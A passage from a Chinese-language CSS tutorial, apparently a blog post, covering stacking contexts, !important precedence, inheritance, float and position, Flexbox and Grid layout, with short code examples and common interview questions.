title="层叠上下文的核心原理"></a>层叠上下文的核心原理</h3><p><strong>形成条件（触发 BFC 的升级版）</strong></p><ul><li>position: relative&#x2F;absolute&#x2F;fixed + z-index ≠ auto</li><li>opacity &lt; 1</li><li>transform&#x2F;filter 非 none</li><li>flex&#x2F;grid容器的子项且z-index ≠ auto</li></ul><p><strong>黄金规则</strong></p><ul><li>每个层叠上下文自成体系（内部 z-index 仅在该上下文中比较）</li><li>兄弟元素按 z-index 数值排序</li><li>不同上下文的比较取决于父级层叠上下文的层级</li></ul><p><strong>示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div style=&quot;position: relative; z-index: 1;&quot;&gt;<br>  &lt;div style=&quot;position: absolute; z-index: 100;&quot;&gt;A&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;div style=&quot;position: relative; z-index: 2;&quot;&gt;<br>  &lt;div style=&quot;position: absolute; z-index: 1;&quot;&gt;B&lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>最终显示顺序：B 覆盖 A（父级上下文 z-index: 2 &gt; 1）</p><h3 id="important-终极权重"><a href="#important-终极权重" class="headerlink" title="!important 终极权重"></a>!important 终极权重</h3><p><strong>权重等级表</strong></p><table><thead><tr><th align="left">来源</th><th align="left">示例</th><th align="left">权重值</th></tr></thead><tbody><tr><td align="left">用户代理!important</td><td align="left">浏览器默认样式</td><td align="left">∞+3</td></tr><tr><td align="left">用户!important</td><td align="left">用户自定义样式表</td><td align="left">∞+2</td></tr><tr><td align="left">作者!important</td><td align="left">开发者写的!important</td><td align="left">∞+1</td></tr><tr><td align="left">动画关键帧</td><td align="left">@keyframes</td><td align="left">∞</td></tr><tr><td align="left">普通作者声明</td><td align="left">常规CSS规则</td><td align="left">按选择器权重</td></tr></tbody></table><p><strong>破解 !important</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 原始问题样式 */</span><br><span class="hljs-selector-class">.btn</span> &#123; <span class="hljs-attribute">color</span>: red <span class="hljs-meta">!important</span>; &#125;<br><br><span class="hljs-comment">/* 解决方案1：更高权重!important */</span><br><span class="hljs-selector-tag">html</span> <span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.btn</span> &#123; <span class="hljs-attribute">color</span>: blue <span class="hljs-meta">!important</span>; &#125;<br><br><span class="hljs-comment">/* 解决方案2：JavaScript修改内联样式 */</span><br>element<span class="hljs-selector-class">.style</span><span class="hljs-selector-class">.setProperty</span>(&#x27;<span class="hljs-attribute">color</span>&#x27;, &#x27;green&#x27;, &#x27;important&#x27;);<br></code></pre></td></tr></table></figure><h3 id="继承规则"><a href="#继承规则" class="headerlink" title="继承规则"></a>继承规则</h3><p><strong>可继承属性清单</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">- 文本相关：`font-family`, `color`, `line-height`<br>- 列表相关：`list-style-type`<br>- 表格相关：`border-collapse`<br>- 可见性：`visibility`<br>- 光标：`cursor`<br></code></pre></td></tr></table></figure><p><strong>显式继承技巧</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.ant-input</span> &#123;<br>  <span class="hljs-attribute">font</span>: inherit;  <span class="hljs-comment">/* 强制继承父元素字体设置 */</span><br>  <span class="hljs-attribute">color</span>: inherit;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>继承链中断场景</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div style=&quot;font-size: 16px;&quot;&gt;<br>  &lt;span style=&quot;font-size: 1.5em;&quot;&gt;24px&lt;/span&gt;<br>  &lt;!-- 子元素设置非继承属性如width会中断 --&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><h1 id="第二章：CSS-布局技术"><a href="#第二章：CSS-布局技术" class="headerlink" title="第二章：CSS 布局技术"></a>第二章：CSS 布局技术</h1><h2 id="2-1-传统布局（浮动-float、定位-position）"><a href="#2-1-传统布局（浮动-float、定位-position）" class="headerlink" title="2.1 传统布局（浮动 float、定位 position）"></a>2.1 传统布局（浮动 float、定位 position）</h2><h3 id="浮动布局（float）"><a href="#浮动布局（float）" class="headerlink" title="浮动布局（float）"></a>浮动布局（float）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.float-item</span> &#123;<br>  <span class="hljs-attribute">float</span>: left | right | none;<br>  <span class="hljs-attribute">clear</span>: both | left | right; <span class="hljs-comment">/* 清除浮动影响 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>核心机制</strong></p><ul><li>文档流破坏：浮动元素会脱离普通流，其他盒子会“无视它”（但文本内容会围绕）</li><li>包裹性：浮动元素会默认收缩宽度以适应内容（除非显式设置宽度）</li></ul><p><strong>经典应用场景</strong></p><p>（1）多栏布局（早期实现方式）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.left-col</span> &#123; <span class="hljs-attribute">float</span>: left; <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>; &#125;<br><span class="hljs-selector-class">.right-col</span> &#123; <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">210px</span>; &#125;<br></code></pre></td></tr></table></figure><p>（2）图文混排</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">img</span> &#123;<br>  <span class="hljs-attribute">float</span>: left;<br>  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">15px</span>;<br>  <span class="hljs-attribute">shape-outside</span>: <span class="hljs-built_in">circle</span>(); <span class="hljs-comment">/* 高级文字环绕 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>陷阱：高度塌陷问题</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS">&lt;<span class="hljs-selector-tag">div</span> class=&quot;parent&quot;&gt;<br>  &lt;<span class="hljs-selector-tag">div</span> class=&quot;<span class="hljs-attribute">float</span>-child&quot;&gt;&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;!-- parent高度为<span class="hljs-number">0</span> --&gt;<br></code></pre></td></tr></table></figure><h3 id="定位布局（position）-精准控制的利器"><a href="#定位布局（position）-精准控制的利器" class="headerlink" title="定位布局（position） - 精准控制的利器"></a>定位布局（position） - 精准控制的利器</h3><p><strong>各大定位类型对比</strong></p><table><thead><tr><th align="left">类型</th><th align="left">脱离文档流</th><th align="left">定位基准</th><th align="left">典型应用场景</th></tr></thead><tbody><tr><td align="left">static</td><td align="left">否</td><td align="left">正常流</td><td align="left">默认值</td></tr><tr><td align="left">relative</td><td align="left">否</td><td align="left">自身原始位置</td><td align="left">微调元素&#x2F;建立定位上下文</td></tr><tr><td align="left">absolute</td><td align="left">是</td><td align="left">最近非static祖先</td><td align="left">弹窗&#x2F;下拉菜单&#x2F;工具提示</td></tr><tr><td align="left">fixed</td><td align="left">是</td><td align="left">视口</td><td align="left">固定导航栏&#x2F;悬浮按钮</td></tr><tr><td align="left">sticky</td><td align="left">是（滚动时）</td><td align="left">最近滚动容器</td><td align="left">吸顶效果&#x2F;表头固定</td></tr></tbody></table><p><strong>粘性定位（sticky）的阈值控制</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.sticky-header</span> &#123;<br>  <span class="hljs-attribute">position</span>: sticky;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* 距离视口顶部20px时触发固定 */</span><br>  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>失效条件：</p><ul><li>父元素设置 overflow: hidden</li><li>未指定 top&#x2F;bottom&#x2F;left&#x2F;right 任一值</li></ul><h2 id="2-2-Flex-弹性布局（flex-direction、justify-content、align-items）"><a href="#2-2-Flex-弹性布局（flex-direction、justify-content、align-items）" class="headerlink" title="2.2 Flex 弹性布局（flex-direction、justify-content、align-items）"></a>2.2 Flex 弹性布局（flex-direction、justify-content、align-items）</h2><p>flex 弹性布局最核心的三要素：</p><ul><li>flex-direction</li><li>justify-content</li><li>align-items</li></ul><h3 id="flex-direction-主轴方向控制"><a href="#flex-direction-主轴方向控制" class="headerlink" title="flex-direction - 主轴方向控制"></a>flex-direction - 主轴方向控制</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 响应式布局切换 */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">flex-direction</span>: row;   <span class="hljs-comment">/* 桌面端 */</span><br>&#125;<br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">flex-direction</span>: column; <span class="hljs-comment">/* 移动端 */</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>作用</strong>：定义 Flex 容器的主轴方向，直接影响子项的排列方式</p><p><strong>属性详解</strong></p><table><thead><tr><th align="left">属性值</th><th align="left">效果图示</th><th align="left">典型应用场景</th></tr></thead><tbody><tr><td align="left">row（默认）</td><td align="left">→ → → →</td><td align="left">水平导航栏&#x2F;商品列表</td></tr><tr><td align="left">row-reverse</td><td align="left">← ← ← ←</td><td align="left">从右到左的特殊布局需求</td></tr><tr><td align="left">column</td><td align="left">↓</td><td align="left">移动端垂直菜单&#x2F;瀑布流</td></tr><tr><td align="left">column-reverse</td><td align="left">↑</td><td align="left">聊天消息时间倒序展示</td></tr></tbody></table><h3 id="justify-content-主轴对齐方式"><a href="#justify-content-主轴对齐方式" class="headerlink" title="justify-content - 主轴对齐方式"></a>justify-content - 主轴对齐方式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 表格工具栏布局 */</span><br><span class="hljs-selector-class">.toolbar</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">justify-content</span>: space-between; <span class="hljs-comment">/* 左右分组 */</span><br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">16px</span>;<br>&#125;<br><br><span class="hljs-comment">/* 弹性网格布局 */</span><br><span class="hljs-selector-class">.grid</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>  <span class="hljs-attribute">justify-content</span>: space-around; <span class="hljs-comment">/* 卡片四周留白均匀 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>作用</strong>：控制子项在主轴上的对齐与空间分配</p><p><strong>属性详解</strong></p><table><thead><tr><th align="left">属性值</th><th align="left">效果图示</th><th align="left">空间分配规则</th></tr></thead><tbody><tr><td align="left">flex-start</td><td align="left">[■ ■ ■]________</td><td align="left">向主轴起点聚集（默认）</td></tr><tr><td align="left">flex-end</td><td align="left">________[■ ■ ■]</td><td align="left">向主轴终点聚集</td></tr><tr><td align="left">center</td><td align="left"><code>____[■ ■ ■]____</code></td><td align="left">居中排列</td></tr><tr><td align="left">space-between</td><td align="left">[■][■][■]</td><td align="left">首尾贴边，中间均分</td></tr><tr><td align="left">space-around</td><td align="left">[■][■][■]</td><td align="left">每个项目两侧间距相等</td></tr><tr><td align="left">space-evenly</td><td align="left">[■][■][■]</td><td align="left">项目与容器间距完全均分</td></tr></tbody></table><h3 id="align-items-交叉轴对齐方式"><a href="#align-items-交叉轴对齐方式" class="headerlink" title="align-items - 交叉轴对齐方式"></a>align-items - 交叉轴对齐方式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 表单输入行对齐 */</span><br><span class="hljs-selector-class">.form-row</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: baseline; <span class="hljs-comment">/* 让label和input文字基线对齐 */</span><br>&#125;<br><br><span class="hljs-comment">/* 垂直居中终极方案 */</span><br><span class="hljs-selector-class">.modal</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: center;<br>  <span class="hljs-attribute">justify-content</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>作用</strong>：控制子项在交叉轴上的对齐方式（单行布局）</p><p><strong>属性详解</strong></p><table><thead><tr><th align="left">属性值</th><th align="left">对齐规则</th></tr></thead><tbody><tr><td align="left">stretch（默认）</td><td align="left">拉伸填满容器高度</td></tr><tr><td align="left">flex-start</td><td align="left">向交叉轴起点对齐</td></tr><tr><td align="left">flex-end</td><td align="left">向交叉轴终点对齐</td></tr><tr><td align="left">center</td><td align="left">居中对齐</td></tr><tr><td align="left">baseline</td><td align="left">按文本基线对齐</td></tr></tbody></table><h3 id="三属性联调实践"><a href="#三属性联调实践" class="headerlink" title="三属性联调实践"></a>三属性联调实践</h3><p>（1）圣杯布局实现</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.holy-grail</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-direction</span>: column;<br>  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span>, <span class="hljs-selector-class">.footer</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> auto;<br>&#125;<br><span class="hljs-selector-class">.content</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-direction</span>: row;<br>&#125;<br><span class="hljs-selector-class">.main</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-selector-class">.sidebar</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">order</span>: -<span class="hljs-number">1</span>; <span class="hljs-comment">/* 左侧边栏 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）等高卡片组</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card-group</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: stretch; <span class="hljs-comment">/* 关键设置 */</span><br>&#125;<br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">/* 无需设置高度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试题"><a href="#高频面试题" class="headerlink" title="高频面试题"></a>高频面试题</h3><p>（1）justify-content: space-between 最后一行左对齐怎么实现？</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.grid</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>  <span class="hljs-attribute">justify-content</span>: space-between;<br>&#125;<br><span class="hljs-comment">/* 添加占位元素 */</span><br><span class="hljs-selector-class">.grid</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">flex</span>: auto; <span class="hljs-comment">/* 或固定宽度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）如何让 flex 项目在交叉方向上溢出容器？</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: flex-start; <span class="hljs-comment">/* 关键设置 */</span><br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）flex 实现两栏布局，右侧内容溢出时出现滚动条？</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.layout</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;<br>&#125;<br><span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">200px</span>; &#125;<br><span class="hljs-selector-class">.main</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-Grid-网格布局（grid-template、grid-area、fr-单位）"><a href="#2-3-Grid-网格布局（grid-template、grid-area、fr-单位）" class="headerlink" title="2.3 Grid 网格布局（grid-template、grid-area、fr 单位）"></a>2.3 Grid 网格布局（grid-template、grid-area、fr 单位）</h2><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><p>grid 布局属于二维布局模型：同时控制行和列的排布，与 flexbox （一维）形成互补</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid; <span class="hljs-comment">/* 开启网格布局 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="grid-template-系列属性详解"><a href="#grid-template-系列属性详解" class="headerlink" title="grid-template 系列属性详解"></a>grid-template 系列属性详解</h3><p><strong>grid-template-columns&#x2F;rows</strong></p><ul><li>作用：定义显示网格的列&#x2F;行尺寸<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid; <span class="hljs-comment">/* 开启网格布局 */</span><br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">200px</span> <span class="hljs-number">1</span>fr; <span class="hljs-comment">/* 两列：固定+弹性 */</span><br>  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">80px</span> auto <span class="hljs-number">60px</span>; <span class="hljs-comment">/* 三行 */</span><br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>; <span class="hljs-comment">/* 网格间隙 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>grid-template-areas</strong></p><ul><li>作用：可视化布局声明<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.dashboard</span> &#123;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar content .&quot;</span><br>    <span class="hljs-string">&quot;footer footer footer&quot;</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span> &#123; <span class="hljs-attribute">grid-area</span>: header; &#125;<br><span class="hljs-comment">/* 其他区域同理 */</span><br></code></pre></td></tr></table></figure></li><li>规则：相同命名区域必须形成矩形；点号（.）表示空白区域</li></ul><p><strong>复合写法 <code>grid-template</code></strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 行 / 列 / 区域 */</span><br><span class="hljs-attribute">grid-template</span>: <br>  <span class="hljs-string">&quot;head head&quot;</span> <span class="hljs-number">80px</span><br>  <span class="hljs-string">&quot;nav main&quot;</span> <span class="hljs-number">1</span>fr<br>  / <span class="hljs-number">200px</span> <span class="hljs-number">1</span>fr;<br></code></pre></td></tr></table></figure><h3 id="grid-area-详解"><a href="#grid-area-详解" class="headerlink" title="grid-area 详解"></a>grid-area 详解</h3><p><strong>基础定义</strong></p><p>grid-area 是 CSS Grid 布局中用于精确控制网格项位置的核心属性，是以下属性的复合写法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">grid-row-start</span> / <span class="hljs-attribute">grid-column-start</span> / <span class="hljs-attribute">grid-row-end</span> / <span class="hljs-attribute">grid-column-end</span><br></code></pre></td></tr></table></figure><p><strong>四大核心功能</strong></p><p>（1）作为 <code>grid-template-areas</code> 的命名引用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar main&quot;</span>;<br>&#125;<br><span class="hljs-selector-class">.header</span> &#123; <span class="hljs-attribute">grid-area</span>: header; &#125; <span class="hljs-comment">/* 自动填充对应区域 */</span><br><span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">grid-area</span>: sidebar; &#125;<br></code></pre></td></tr></table></figure><p>（2）作为定位简写（行开始&#x2F;列开始&#x2F;行结束&#x2F;列结束）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/*3 行 3 列共 9 格*/</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>fr); <span class="hljs-comment">/* 3 列 */</span><br>  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">100px</span>); <span class="hljs-comment">/* 3 行 */</span><br>&#125;<br><span class="hljs-comment">/*第 2 行第 1 列开始，第 4 行第 3 列结束，占用第2-3行，第1-2列*/</span><br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">2</span> / <span class="hljs-number">1</span> / <span class="hljs-number">4</span> / <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）配合命名线使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">grid-template-columns</span>: [main-start] <span class="hljs-number">1</span>fr [content-start] <span class="hljs-number">1</span>fr [main-end];<br>&#125;<br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">1</span> / content-start / <span class="hljs-number">3</span> / main-end;<br>&#125;<br></code></pre></td></tr></table></figure><p>（4）自适应布局案例</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-selector-class">.app</span> &#123;<br>    <span class="hljs-attribute">grid-template-areas</span>:<br>      <span class="hljs-string">&quot;header&quot;</span><br>      <span class="hljs-string">&quot;content&quot;</span><br>      <span class="hljs-string">&quot;sidebar&quot;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fr-单位-网格专属空间分配"><a href="#fr-单位-网格专属空间分配" class="headerlink" title="fr 单位 - 网格专属空间分配"></a>fr 单位 - 网格专属空间分配</h3><p><strong>核心特性</strong></p><ul><li>按比例分配容器剩余可用空间，与 Flex 的 flex-grow 类似但计算时机不同</li><li>与 <code>minmax()</code> 组合实现弹性限制<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">300px</span> <span class="hljs-built_in">minmax</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>fr) <span class="hljs-number">1</span>fr;<br></code></pre></td></tr></table></figure></li></ul><p><strong>计算规则</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">2</span>fr <span class="hljs-number">100px</span>;<br></code></pre></td></tr></table></figure><ul><li>总宽度 &#x3D; 容器宽度 - 固定列宽（100px）- 列间距（gap）</li><li>剩余空间按 1:2 比例分配</li></ul><p><strong>与百分比的区别</strong></p><table><thead><tr><th align="left">特性</th><th align="left">fr</th><th align="left">%</th></tr></thead><tbody><tr><td align="left">计算基准</td><td align="left">剩余空间</td><td align="left">父容器总空间</td></tr><tr><td align="left">是否受网格间隙（gap）影响</td><td align="left">分配前扣除gap</td><td align="left">包含gap</td></tr><tr><td align="left">组合弹性</td><td align="left">可与固定宽度混合</td><td align="left">需配合calc</td></tr></tbody></table><h3 id="高频面试问题"><a href="#高频面试问题" class="headerlink" title="高频面试问题"></a>高频面试问题</h3><p>（1）grid-area 如何实现跨行跨列</p><figure class="highlight 